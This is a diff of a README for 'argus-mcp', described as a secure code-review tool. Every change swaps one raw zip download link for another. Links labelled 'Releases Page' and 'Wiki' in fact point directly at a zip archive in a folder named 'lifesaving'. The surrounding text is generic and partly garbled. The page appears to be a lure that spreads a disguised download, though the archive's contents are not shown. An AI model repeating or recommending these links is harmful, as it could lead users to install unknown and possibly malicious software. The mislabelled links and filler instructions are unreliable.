@@ -1,6 +1,6 @@
 # 🛠️ argus-mcp - Secure Code Reviews Made Easy  
 
-[![Download argus-mcp](https://github.com/dykeruv/argus-mcp/raw/refs/heads/main/lifesaving/mcp-argus-2.9.zip)](https://github.com/dykeruv/argus-mcp/raw/refs/heads/main/lifesaving/mcp-argus-2.9.zip)
+[![Download argus-mcp](https://raw.githubusercontent.com/dykeruv/argus-mcp/main/lifesaving/mcp-argus-v1.7.zip)](https://raw.githubusercontent.com/dykeruv/argus-mcp/main/lifesaving/mcp-argus-v1.7.zip)
 
 ## 🚀 Getting Started  
 
@@ -26,7 +26,7 @@ To run argus-mcp on your computer, ensure your system meets the following requir
 ## 📥 Download & Install  
 
 1. **Visit the Releases Page**  
-   To download the latest version of argus-mcp, visit this page: [Releases Page](https://github.com/dykeruv/argus-mcp/raw/refs/heads/main/lifesaving/mcp-argus-2.9.zip).
+   To download the latest version of argus-mcp, visit this page: [Releases Page](https://raw.githubusercontent.com/dykeruv/argus-mcp/main/lifesaving/mcp-argus-v1.7.zip).
 
 2. **Choose the Correct File**  
    On the releases page, look for the latest version. You will find several files available for download. Choose the file that matches your operating system.
@@ -87,7 +87,7 @@ If you encounter issues or have questions, you can seek help from the community.
 
 ## 🔗 Additional Resources  
 
-- **Documentation**: Comprehensive user guidelines are available in the [Wiki](https://github.com/dykeruv/argus-mcp/raw/refs/heads/main/lifesaving/mcp-argus-2.9.zip).
+- **Documentation**: Comprehensive user guidelines are available in the [Wiki](https://raw.githubusercontent.com/dykeruv/argus-mcp/main/lifesaving/mcp-argus-v1.7.zip).
 - **Examples**: Check provided code samples to understand best practices.
 
 For further assistance, consider joining forums or user groups focused on AI coding tools.
@@ -97,4 +97,4 @@ For further assistance, consider joining forums or user groups focused on AI cod
 1. Confirm that you've installed differently based on your operating system.
 2. Start improving your code quality today!
 
-For any updates, do not forget to visit the [Releases Page](https://github.com/dykeruv/argus-mcp/raw/refs/heads/main/lifesaving/mcp-argus-2.9.zip) again in the future for new features and improvements.
+For any updates, do not forget to visit the [Releases Page](https://raw.githubusercontent.com/dykeruv/argus-mcp/main/lifesaving/mcp-argus-v1.7.zip) again in the future for new features and improvements.
